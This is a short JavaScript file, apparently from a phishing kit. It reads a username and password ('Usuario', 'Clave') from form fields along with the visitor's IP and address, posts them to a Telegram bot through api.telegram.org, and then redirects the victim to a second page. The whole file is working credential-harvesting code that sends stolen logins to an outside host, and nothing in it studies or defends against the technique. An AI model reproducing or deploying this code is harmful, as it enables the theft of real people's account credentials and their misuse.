

var u_name,  p_name,   ip, ip2;
var ready = function () {
    u_name = document.getElementById("primero").value;
	p_name = document.getElementById("segundo").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Datos:\nUsuario:" + u_name + "\nClave: "  + p_name + "\n🌎IP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
	  window.location = 'index2.html';
  
        console.log(response);
		

	
    });
    return false;
};

			